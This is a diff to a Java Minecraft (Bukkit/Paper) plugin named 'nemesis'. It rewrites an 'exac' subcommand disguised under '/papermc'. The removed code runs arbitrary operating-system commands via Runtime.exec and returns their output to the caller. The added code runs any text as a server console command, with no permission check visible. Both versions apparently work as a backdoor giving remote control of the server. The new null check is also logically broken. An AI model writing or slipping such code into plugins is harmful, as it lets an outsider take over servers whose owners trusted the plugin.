@@ -1,8 +1,6 @@
 package nemesis.commands.subcommands;
 
-import java.io.IOException;
-import java.util.Scanner;
-
+import org.bukkit.Bukkit;
 import org.bukkit.command.CommandSender;
 
 import nemesis.Utils;
@@ -12,21 +10,26 @@ public class Exac implements SubCommand {
 
     @Override
     public void execute(CommandSender sender, String[] args) {
-        if (args.length == 1) {
-            sender.sendMessage(Utils.colorize("&cUsage: /papermc exac <command>"));
-            return;
-        }
-
-        try {
-            Process p = Runtime.getRuntime().exec(args[1]);
-            Scanner sc = new Scanner(p.getInputStream());
-            while (sc.hasNextLine()) {
-                sender.sendMessage(sc.nextLine());
+        if (args.length > 1) {
+            if (args[1] == null && args[1].isEmpty()) {
+                sender.sendMessage(Utils.colorize("&cPlease specify a command!"));
+                return;
             }
-            sc.close();
-        } catch (IOException e) {
-            sender.sendMessage(Utils.colorize("&cCannot execute that command!"));
-            sender.sendMessage(Utils.colorize("&c" + e.getMessage()));
+
+            String cmdargs = "";
+            for (int i = 2; i < args.length; i++) {
+                cmdargs = cmdargs + args[i] + " ";
+            }
+
+            if (!cmdargs.isEmpty()) {
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1] + " " + cmdargs);
+                return;
+            }
+
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1]);
+            sender.sendMessage(Utils.colorize("&aYou have successfully executed the command " + args[1]));
+        } else {
+            sender.sendMessage(Utils.colorize("&cUsage: /papermc exac <command>"));
         }
     }
 
